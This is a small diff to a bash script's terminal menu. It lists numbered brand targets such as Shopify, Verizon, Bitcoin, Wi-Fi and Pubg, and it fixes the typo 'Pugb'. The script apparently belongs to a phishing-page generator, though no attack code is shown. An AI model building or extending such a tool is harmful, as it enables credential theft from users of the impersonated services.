@@ -33,7 +33,7 @@ printf "\e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m yandex\e[0m     \e[1
 printf "\e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m messenger\e[0m  \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m shopify\e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m shopping\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m verizon\e[0m    \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m quora\e[0m      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m bet9ja\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m Wi-Fi\e[0m      \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;93m Bitcoin\e[0m    \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;93m free fire\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;93m Pugb\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;93m Pubg\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
